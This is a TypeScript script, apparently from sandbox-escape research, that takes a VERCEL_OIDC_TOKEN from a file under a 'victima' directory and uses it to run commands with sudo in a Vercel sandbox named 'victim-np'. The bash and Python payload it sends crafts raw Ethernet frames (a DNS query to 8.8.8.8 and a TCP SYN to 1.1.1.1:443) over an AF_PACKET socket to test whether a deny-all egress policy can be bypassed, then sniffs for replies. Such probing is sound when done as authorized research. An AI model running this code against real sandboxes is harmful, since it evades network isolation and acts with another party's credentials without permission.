import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== confirm deny-all still active ==="
timeout 3 curl -s -o /dev/null -w "code=%{http_code}\\n" --max-time 2 http://1.1.1.1/ 2>&1 | head -2
echo "=== raw DNS query to 8.8.8.8:53 under deny-all + sniff ==="
timeout 12 python3 - <<'PYEOF'
import socket, struct, time, select, subprocess, binascii, random, os
# get ip and mac
out = subprocess.check_output(["ip","-4","addr","show","eth0"]).decode()
myip = ""
for line in out.splitlines():
    if "inet " in line:
        myip = line.strip().split()[1].split("/")[0]
mac = open("/sys/class/net/eth0/address").read().strip()
# gateway mac from arp
arp = open("/proc/net/arp").read()
gmac = None
for line in arp.splitlines()[1:]:
    p = line.split()
    if p[0] == "100.64.0.1":
        gmac = p[3]
print("myip", myip, "my mac", mac, "gw mac", gmac, flush=True)
gwmac = binascii.unhexlify(gmac.replace(":","")) if gmac else b"\\xff"*6
mymac = binascii.unhexlify(mac.replace(":",""))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind(("eth0",0))
# DNS query
tid = random.randint(0,65535)
def build_dns(qname):
    q = b"".join(bytes([len(x)])+x.encode() for x in qname.split(".")) + b"\\x00"
    return struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + q + struct.pack("!HH", 1, 1)
qname = "example.com"
dns = build_dns(qname)
sport = random.randint(10000,60000)
udp_len = 8 + len(dns)
udp = struct.pack("!HHHH", sport, 53, udp_len, 0) + dns
tot = 20 + len(udp)
ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, 0x9999, 0, 64, 17, 0,
                 socket.inet_aton(myip), socket.inet_aton("8.8.8.8"))
frame = gwmac + mymac + struct.pack("!H", 0x0800) + ip + udp
try:
    s.send(frame)
    print("raw DNS UDP sent to 8.8.8.8:53 from " + myip, flush=True)
except Exception as e:
    print("send err", e, flush=True)
# sniff for DNS response
seen = {}
end = time.time()+8
while time.time() < end:
    r,_,_ = select.select([s],[],[],0.5)
    if not r: continue
    try: data = s.recv(65535)
    except Exception: continue
    if len(data) < 42: continue
    eth = data[:14]
    dst, src, etype = struct.unpack("!6s6sH", eth)
    if etype != 0x0800: continue
    iph = data[14:34]
    srcip = socket.inet_ntoa(iph[12:16]); dstip = socket.inet_ntoa(iph[16:20])
    proto = iph[9]
    if proto == 17:
        udph = data[34:42]
        dp, sp = struct.unpack("!HH", udph[0:4])
        if sp == 53:
            print("UDP response from %s:%d -> %s:%d" % (srcip, sp, dstip, dp), flush=True)
            print("DNS payload:", data[42+12:42+60], flush=True)
            seen["dns"] = seen.get("dns",0)+1
    if proto == 6:
        tcph = data[34:54]
        dport = struct.unpack("!H", tcph[2:4])[0]
        flags = tcph[13]
        print("TCP packet from %s:%d dstport=%d flags=%d" % (srcip, struct.unpack("!H",tcph[0:2])[0], dport, flags), flush=True)
print("result: dns_responses=%s" % seen.get("dns",0), flush=True)
PYEOF
echo "=== raw TCP SYN to 1.1.1.1:443 under deny-all + sniff ==="
timeout 8 python3 - <<'PYEOF'
import socket, struct, time, select, subprocess, binascii, random
out = subprocess.check_output(["ip","-4","addr","show","eth0"]).decode()
myip = ""
for line in out.splitlines():
    if "inet " in line:
        myip = line.strip().split()[1].split("/")[0]
mac = open("/sys/class/net/eth0/address").read().strip()
arp = open("/proc/net/arp").read()
gmac = None
for line in arp.splitlines()[1:]:
    p = line.split()
    if p[0] == "100.64.0.1":
        gmac = p[3]
gwmac = binascii.unhexlify(gmac.replace(":","")) if gmac else b"\\xff"*6
mymac = binascii.unhexlify(mac.replace(":",""))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind(("eth0",0))
seq = random.randint(0,0xffffffff)
sport = random.randint(10000,60000)
# TCP SYN
tcp = struct.pack("!HHIIHHHH", sport, 443, seq, 0, 0x5002, 65535, 0, 0)
ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20+20, 0x7777, 0, 64, 6, 0,
                 socket.inet_aton(myip), socket.inet_aton("1.1.1.1"))
frame = gwmac + mymac + struct.pack("!H", 0x0800) + ip + tcp
try:
    s.send(frame)
    print("raw TCP SYN sent to 1.1.1.1:443", flush=True)
except Exception as e:
    print("send err", e, flush=True)
seen = {}
end = time.time()+6
while time.time() < end:
    r,_,_ = select.select([s],[],[],0.5)
    if not r: continue
    try: data = s.recv(65535)
    except Exception: continue
    if len(data) < 54: continue
    eth = data[:14]
    dst, src, etype = struct.unpack("!6s6sH", eth)
    if etype != 0x0800: continue
    iph = data[14:34]
    srcip = socket.inet_ntoa(iph[12:16])
    if iph[9] == 6:
        tcph = data[34:54]
        sp, dp = struct.unpack("!HH", tcph[0:4])
        flags = tcph[13]
        if sp == 443:
            print("TCP from %s:443 -> dstport %d flags 0x%02x" % (srcip, dp, flags), flush=True)
            seen["tcp"] = seen.get("tcp",0)+1
            if flags & 0x12:
                print("SYN-ACK received! (0x12) or RST-ACK", flush=True)
    elif iph[9] == 1:
        print("ICMP from %s type %d code %d" % (srcip, data[34], data[35]), flush=True)
print("result: tcp=%s" % seen.get("tcp",0), flush=True)
PYEOF
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore27.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore27.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });